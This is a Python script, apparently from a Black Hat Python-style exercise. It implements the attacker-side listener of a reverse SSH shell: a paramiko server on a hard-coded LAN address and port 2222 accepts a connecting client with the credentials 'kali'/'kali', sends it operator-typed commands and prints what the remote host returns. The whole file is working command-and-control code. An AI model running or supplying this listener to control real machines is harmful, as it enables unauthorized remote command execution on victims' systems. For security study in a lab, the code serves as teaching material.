from audioop import add
from http.client import responses
import os
from pathlib import Path
import sys
import paramiko
import socket
import threading


CWD = str(Path(__file__).parent.parent)
filename = CWD + '/dependency_lib/paramiko/tests/test_rsa.key'
HOSTKEY = paramiko.RSAKey(filename=filename)


class Server (paramiko.ServerInterface):
    def __init__(self) -> None:
        self.event = threading.Event()
        
    def check_channel_request(self, kind: str, chanid: int):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username: str, password: str) -> int:
        if (username == 'kali') and (password == 'kali'):
            return paramiko.AUTH_SUCCESSFUL


if __name__ ==  '__main__':
    server = '192.168.31.236'
    port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen(100)
        print('[*] Listening for connection ... ')
        client, addr = sock.accept()
    except Exception as e:
        print('[!] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[*] Got a connection!' , client, addr)

    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('[!] No channel.')
        sys.exit()
    
    print('[*] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command = input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                response =chan.recv(8129)
                print(response.decode())
            else:
                chan.send('exit')
                print('exiting...')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
